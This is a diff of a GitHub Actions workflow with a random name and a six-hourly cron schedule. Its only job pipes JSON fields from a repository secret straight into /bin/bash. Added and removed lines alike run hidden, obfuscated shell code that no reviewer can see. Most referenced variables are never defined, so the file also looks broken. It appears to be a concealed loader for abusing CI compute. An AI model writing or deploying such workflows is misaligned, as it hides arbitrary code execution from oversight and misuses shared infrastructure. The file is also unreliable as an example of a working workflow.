@@ -3,29 +3,20 @@ name: jeanspheasant
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 5/6 * * *'
-
+    - cron: '10 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: jeanspheasant
         env:
-          kcnww8: ${{ secrets.kcnww8 }}
+          c4673: ${{ secrets.c4673 }}
         run: |
-          echo $kcnww8 | jq -r .zt651 | /bin/bash
-          echo $j10 | jq -r .u9 | /bin/bash
-          echo $bvgy255 | jq -r .af58 | /bin/bash
-          echo $evrnl4413 | jq -r .qmc9 | /bin/bash
-          echo $hkqb085 | jq -r .ll75 | /bin/bash
-          echo $mdkh465 | jq -r .kiew996 | /bin/bash
-          echo $fdcd58 | jq -r .li8581 | /bin/bash
-          echo $cvavs7051 | jq -r .lil6506 | /bin/bash
-          echo $pdt50860 | jq -r .ptzn508 | /bin/bash
-          echo $ez5263 | jq -r .q5414 | /bin/bash
-          echo $x8 | jq -r .eoa55 | /bin/bash
-          echo $sp145 | jq -r .geb4 | /bin/bash
-          echo $hjqfw18523 | jq -r .muc43 | /bin/bash
-          echo $muef0 | jq -r .uq1 | /bin/bash
+          echo $c4673 | jq -r .pivhf64437 | /bin/bash
+          echo $zgtf9 | jq -r .emn0 | /bin/bash
+          echo $qct24 | jq -r .mtpc14401 | /bin/bash
+          echo $k165 | jq -r .gd7 | /bin/bash
+          echo $h14 | jq -r .xcfsg706 | /bin/bash
 
